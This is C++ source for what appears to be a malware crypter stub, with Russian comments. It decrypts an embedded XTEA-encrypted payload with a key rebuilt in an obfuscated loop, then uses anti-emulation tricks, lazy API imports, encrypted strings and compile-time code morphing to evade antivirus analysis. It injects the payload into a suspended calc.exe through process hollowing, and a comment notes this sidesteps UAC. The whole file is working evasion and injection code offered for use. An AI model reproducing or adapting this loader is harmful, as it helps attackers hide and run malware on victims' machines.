#include "pch.h"
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include <string.h>

#include "../../modules/modules.h"
#include "../../modules/antiemul/antiemul.h"
#include "../../modules/trash_gen_module/fake_api.h"
#include "../../modules/data_protect.h"
#include "../../modules/lazy_importer/lazy_importer.hpp"
#include "../../modules/data_crypt_string.h"

#include "../../modules/metamorph_code/config.h"
#include "../../modules/metamorph_code/boost/preprocessor/repetition/repeat_from_to.hpp"
#include <boost/preprocessor/cat.hpp>
#include <boost/preprocessor/repetition/repeat_from_to.hpp>

#define SLEEP_KEYGEN 50
#define SLEEP_WAIT 50
#define MEMORY_MALLOC 32*1024*1024

/*
Функция генерирует пароль для расшифроки, по следующему алгоритму:

Генерируется массив случаных чисел от 0 до 9, далее генерируется хеш в качестве ключа, хеш генерируется на основе числа, 
сгенерированного при создании зашифрованного массива защищаемого файла.

Далее сортируется массив от 0 до 9, т.е. в итоге у нас получается хеши от числел 0-9. Отсортированные по порядку.

Параметры:

uint32_t pass[10] - Полученный пароль для расшифровки.
*/
static void pass_gen(uint32_t pass[10]) {

	//while (1);

	uint32_t flag_found = 0;
	uint32_t count = 0;
	uint32_t i = 0;

	//Получаем рандомное число для соли murmurhash
	uint32_t eax_rand = 0;

	//Получение четырехбайтного значения eax_random
	memcpy(&eax_rand, data_protect, sizeof(int));

	printf("#");

	//Получаем массив, случайных числел от 1 до 10
	//Будет делаться случайно, плюс для антитрассировки будут вызываться случайно ассемблерные инструкции и API.
	while (1) {
		if (count == 10) break;
		uint32_t eax_random = do_Random_EAX(25, 50);
		uint32_t random = fake_api_instruction_gen(eax_random + 1, SLEEP_KEYGEN);

		if (pass[count] == random) {
			flag_found = 1;
			count++;
		}

		if (flag_found != 1) {
			if (count == random) {
				pass[count] = Murmur3(&random, sizeof(int), eax_rand);
				flag_found = 0;
				count++;
			}
		}
	}

	printf("#");

}

int main() {

	//Морфинг кода при компиляции************************************************************
    #define DECL(z, n, text) BOOST_PP_CAT(text, n) ();
	BOOST_PP_REPEAT_FROM_TO(START_MORPH_CODE, END_MORPH_CODE, DECL,function)
	//Морфинг кода при компиляции************************************************************

	static uint32_t passw[10];
	memset(passw, 0xff, sizeof(passw));
	pass_gen(passw);

	str_to_decrypt(kernel32, 13, magic_key, 4);

	static uintptr_t base = reinterpret_cast<std::uintptr_t>(LI_FIND(LoadLibraryA)(kernel32));

	//Антиэмуляция **************************************
	anti_emul_sleep(base, NtUnmapView, 21, SLEEP_WAIT);

	//Антиэмуляция **************************************
	anti_emul_sleep(base, ntdll, 10, SLEEP_WAIT);

	//Получение четырехбайтного значения size_file
	uint32_t size_file = 0;
	memcpy(&size_file, data_protect+4, sizeof(int));

	printf("#");

	//Антиэмуляция
	uint8_t *protect_data = antiemul_mem(MEMORY_MALLOC, data_protect, size_file);
	Xtea3_Data_Crypt((char*)(protect_data + 8), size_file, 0, passw);
	printf("#");

	//Запускает процесс calc.exe с параметром suspend, заполняет его пейлоадом и делает resume. Если указать в пути себя, до создаст процесс себя, в таком случае не нужно дербанить UAC
	char targetPath[MAX_PATH];
	LI_GET(base, ExpandEnvironmentStringsA)("%SystemRoot%\\system32\\calc.exe", targetPath, MAX_PATH);
	printf("%s\n", targetPath);

	//Запуск данных в памяти.
	run_pe(base, (BYTE*)(protect_data + 8), size_file, targetPath);

	//Программа не завершает работу, а иммитирует действия из случайных инструкций и вызова API в случайном порядке.
	//Возможно лучше завершать, а может и нет.)))
	uint32_t random = 1;
	while (1) {
		uint32_t eax_random = do_Random_EAX(random, 50);
		random = fake_api_instruction_gen(eax_random + 1, random);
		random++;
	}

	return 0;
}
